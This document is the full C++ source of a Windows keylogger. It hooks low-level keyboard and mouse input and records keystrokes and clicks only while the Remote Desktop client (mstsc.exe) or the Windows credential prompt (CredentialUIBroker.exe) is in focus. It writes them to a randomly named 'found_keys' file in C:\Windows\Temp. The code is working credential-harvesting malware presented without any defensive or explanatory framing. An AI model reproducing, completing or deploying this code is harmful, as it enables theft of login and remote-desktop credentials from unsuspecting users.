#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <ctime>
#include <iostream>


wchar_t filename[80];

DWORD GetProcId(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
    }
    CloseHandle(hSnap);
    return procId;
}


BOOL isWindowOfProcessFocused(const wchar_t* processName) {
    // Get the PID of the process
    DWORD pid = GetProcId(processName);
    if (pid == 0) {
        // Process not found
        return FALSE;
    }

    // Get handle to the active window
    HWND hActiveWindow = GetForegroundWindow();
    if (hActiveWindow == NULL) {
        // No active window found
        return FALSE;
    }

    // Get PID of the active window
    DWORD activePid;
    GetWindowThreadProcessId(hActiveWindow, &activePid);

    // Check if the active window belongs to the process we're interested in
    if (activePid != pid) {
        // Active window does not belong to the specified process
        return FALSE;
    }

    // If we've gotten this far, the active window belongs to our process
    return TRUE;
}

void WriteToFile(char* data)
{
    HANDLE hFile;
    DWORD dwBytesToWrite = (DWORD)strlen(data);
    DWORD dwBytesWritten;
    BOOL bErrorFlag = FALSE;

    hFile = CreateFileW(filename,  // name of the write
        FILE_APPEND_DATA,          // open for appending
        FILE_SHARE_READ,           // share for reading only
        NULL,                      // default security
        OPEN_ALWAYS,               // open existing file or create new file 
        FILE_ATTRIBUTE_NORMAL,     // normal file
        NULL);                     // no attr. template

    if (hFile == INVALID_HANDLE_VALUE)
    {
        //DisplayError(TEXT("CreateFile"));
        wprintf(L"Terminal failure: Unable to create/open file \"%s\" for writing.\n", filename);
        return;
    }

    while (dwBytesToWrite > 0)
    {
        bErrorFlag = WriteFile(
            hFile,              // open file handle
            data,               // start of data to write
            dwBytesToWrite,     // number of bytes to write
            &dwBytesWritten,    // number of bytes that were written
            NULL);              // no overlapped structure

        if (!bErrorFlag)
        {
            //DisplayError(TEXT("WriteFile"));
            printf("Terminal failure: Unable to write to file.\n");
            break;
        }

        wprintf(L"Wrote %u bytes to \"%s\" successfully.\n", dwBytesWritten, filename);

        data += dwBytesWritten;
        dwBytesToWrite -= dwBytesWritten;
    }

    CloseHandle(hFile);
}


LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {

        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {

            static int prev;
            BOOL isLetter = 1;

            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
                int vkCode = kbdStruct->vkCode;

                if (vkCode == 0xA2) { // LCTRL or initial signal of RALT
                    prev = vkCode;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }

                
                if (prev == 0xA2 && vkCode == 0xA5) { // RALT
                    WriteToFile((char*)"<ALT>");
                    isLetter = 0;
                }
                else if (prev == 0xA2 && vkCode != 0xA5) {
                    WriteToFile((char*)"<CTRL>");
                }

                BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                switch (vkCode) {
                case VK_TAB: WriteToFile((char*)"<TAB>"); isLetter = 0; break;
                case 0xA3: WriteToFile((char*)"<RCTRL>"); isLetter = 0; break;
                case 0xA4: WriteToFile((char*)"<LALT>"); isLetter = 0; break;
                case VK_CAPITAL: WriteToFile((char*)"<CAPSLOCK>"); isLetter = 0; break;
                case 0x08: WriteToFile((char*)"<ESC>"); isLetter = 0; break;
                case 0x0D: WriteToFile((char*)"\n"); isLetter = 0; break;
                case VK_OEM_PLUS: shiftPressed ? WriteToFile((char*)"+") : WriteToFile((char*)"="); isLetter = 0; break;
                case VK_OEM_COMMA: shiftPressed ? WriteToFile((char*)"<") : WriteToFile((char*)","); isLetter = 0; break;
                case VK_OEM_MINUS: shiftPressed ? WriteToFile((char*)"_") : WriteToFile((char*)"-"); isLetter = 0; break;
                case VK_OEM_PERIOD: shiftPressed ? WriteToFile((char*)">") : WriteToFile((char*)"."); isLetter = 0; break;
                case VK_OEM_1: shiftPressed ? WriteToFile((char*)":") : WriteToFile((char*)";"); isLetter = 0; break;
                case VK_OEM_2: shiftPressed ? WriteToFile((char*)"?") : WriteToFile((char*)"/"); isLetter = 0; break;
                case VK_OEM_3: shiftPressed ? WriteToFile((char*)"~") : WriteToFile((char*)"`"); isLetter = 0; break;
                case VK_OEM_4: shiftPressed ? WriteToFile((char*)"{") : WriteToFile((char*)"["); isLetter = 0; break;
                case VK_OEM_5: shiftPressed ? WriteToFile((char*)"|") : WriteToFile((char*)"\\"); isLetter = 0; break;
                case VK_OEM_6: shiftPressed ? WriteToFile((char*)"}") : WriteToFile((char*)"]"); isLetter = 0; break;
                case VK_OEM_7: shiftPressed ? WriteToFile((char*)"\"") : WriteToFile((char*)"'"); isLetter = 0; break;
                default: break;
                }

                prev = vkCode;
                if (isLetter) {
                    BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                    if (vkCode >= 0x41 && vkCode <= 0x5A) {
                        if (capsLock ^ shiftPressed) { // XOR operation, to check if exactly one of them is TRUE
							char temp[2];
                            sprintf_s(temp, 2, "%c", vkCode);
							WriteToFile((char*) temp);
                        }
                        else {
							char temp[2];
                            sprintf_s(temp, 2, "%c", vkCode + 0x20); // Convert to lowercase
							WriteToFile((char*) temp);
                        }
                    }
                    else if (vkCode >= 0x61 && vkCode <= 0x7A) {
                        if (capsLock ^ shiftPressed) {
							char temp[2];
                            sprintf_s(temp, 2, "%c", vkCode - 0x20); // Convert to uppercase
							WriteToFile((char*) temp);
                        }
                        else {
							char temp[2];
                            sprintf_s(temp, 2, "%c", vkCode);
							WriteToFile((char*) temp);
                        }
                    }
                    else if (vkCode >= 0x30 && vkCode <= 0x39) { // Check if key is a number key
                        if (shiftPressed) {
                            switch (vkCode) {
                            case '1': WriteToFile((char*)"!"); break;
                            case '2': WriteToFile((char*)"@"); break;
                            case '3': WriteToFile((char*)"#"); break;
                            case '4': WriteToFile((char*)"$"); break;
                            case '5': WriteToFile((char*)"%"); break;
                            case '6': WriteToFile((char*)"^"); break;
                            case '7': WriteToFile((char*)"&"); break;
                            case '8': WriteToFile((char*)"*"); break;
                            case '9': WriteToFile((char*)"("); break;
                            case '0': WriteToFile((char*)")"); break;
                            default: break;
                            }
                        }
                        else {
							char temp[2];
                            sprintf_s(temp, 2, "%c", vkCode);
							WriteToFile((char*) temp);
                        }
                    }
                }
            }


        }
        else
        {
            // When the active window is not related to the specified processes, don't log.
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }


    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);

}


LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {

        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {

            if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN)) {
				
				if(wParam == WM_LBUTTONDOWN) {
					WriteToFile((char*) "<LEFT_CLICK>");
				}
				
				else if(wParam == WM_RBUTTONDOWN) {
					WriteToFile((char*) "<RIGHT_CLICK>");
				}

            }

        }
        else
        {
            // When the active window is not related to the specified processes, don't log.
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }


    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);

}



std::string gen_random(const int len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string tmp_s;
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return tmp_s;
}




int main(void) {
    srand((unsigned)time(NULL) * GetProcessId(GetCurrentProcess())); 
    std::string ran = gen_random(12).c_str();
    swprintf_s(filename, 80, L"C:\\Windows\\Temp\\found_keys_%s.txt", std::wstring(ran.begin(), ran.end()).c_str());
    
    printf("Results: %ls\n", filename);
    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, 0, 0);
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, 0, 0);

    while (true) {
          
            MSG msg;

            while (!GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
    }

    UnhookWindowsHookEx(mouseHook);
    UnhookWindowsHookEx(kbdHook);

    return 0;
}
